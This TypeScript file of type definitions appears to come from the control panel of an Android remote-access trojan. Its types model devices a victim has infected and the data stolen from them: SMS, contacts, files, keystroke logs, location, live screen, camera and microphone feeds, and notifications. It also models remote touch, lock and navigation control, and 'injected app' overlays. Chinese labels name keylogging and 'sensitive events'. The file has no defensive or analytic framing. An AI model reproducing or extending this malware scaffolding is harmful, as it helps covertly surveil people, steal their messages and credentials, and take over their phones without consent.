// Device-related Types

export interface Device {
  id: number;
  uuid: string;
  name: string;
  model: string;
  android_version: string;
  country: string;
  ip_address: string;
  phone_number: string;
  battery_level: number;
  network_type: string;
  screen_width?: number;
  screen_height?: number;
  is_online: boolean;
  has_accessibility: boolean;
  installed_at: string;
  last_seen_at: string;
  settings: Record<string, unknown>;
  permissions: Record<string, unknown>;
  tunnel_status?: string;
}

export interface SmsMessage {
  time: string;
  message: string;
  full_message?: string;
  number: string;
  type: number;  // 1=收件, 2=发件
}

export interface Contact {
  name: string;
  number: string;
}

export interface FileItem {
  name: string;
  size: string;
  path: string;
  lastModified: string;
  isDirectory: boolean;
  imageSrc?: string;
}

export interface AppInfo {
  name: string;
  packageName: string;
  icon: string; // Base64 PNG
}

export interface InjectedApp {
  htmlName: string;
  packageName: string;
  logText: string;
}

export interface KeylogEntry {
  time: string;
  app: string;
  action: string;
  status: string;
}

export interface LocationInfo {
  latitude: number;
  longitude: number;
  accuracy?: number;
  timestamp?: string;
}

export interface ScreenData {
  data: string; // Base64 image
  width: number;
  height: number;
}

export interface CameraData {
  data: string; // Base64 image
  isActive: boolean;
}

export interface MicrophoneData {
  data: string; // Base64 audio
  isActive: boolean;
}

// Loading states for data tabs
export interface DataLoadingState {
  sms: boolean;
  contacts: boolean;
  files: boolean;
  apps: boolean;
  keylog: boolean;
  logs: boolean;
}

// Touch event types
export type TouchEventType = 'tap' | 'swipe' | 'longpress';

export interface TouchEvent {
  type: TouchEventType;
  movetype: '0' | '1' | '2'; // 0=tap, 1=swipe, 2=longpress
  coordinates: string | { x: number; y: number };
}

// Navigation types
export type NavigationType = 'home' | 'back' | 'recent';

// Lock types
export type LockType = 0 | 1 | 2 | 3;

// Volume direction
export type VolumeDirection = 'up' | 'down';

// Keyboard state
export type KeyboardState = 'show' | 'hide';

// Camera selection
export type CameraSelection = 'front' | 'back';

// Log types — matches APK ActivityMonitor.LogType enum
export type LogType = 'ACTZ' | 'KSTR' | 'BLNK' | 'VAPS' | 'NTFS' | 'ARTS' | 'SEVT';

export const LOG_TYPE_LABELS: Record<LogType, string> = {
    ACTZ: '用户操作',
    KSTR: '键盘记录',
    BLNK: '浏览器URL',
    VAPS: 'APP使用',
    NTFS: '通知内容',
    ARTS: '系统事件',
    SEVT: '敏感事件',
};

export interface LogFileInfo {
    type: LogType;
    filename: string;
}

export interface LogOptions {
    recKeystrokes: boolean;
    liveKeystrokes: boolean;
    recApps: boolean;
    recLinks: boolean;
    recNotifications: boolean;
}

export interface DeviceLogEntry {
    id: number;
    device_id: number;
    log_type: LogType;
    content: string;
    device_timestamp: string;
    device_uid: string;
    created_at: string;
}
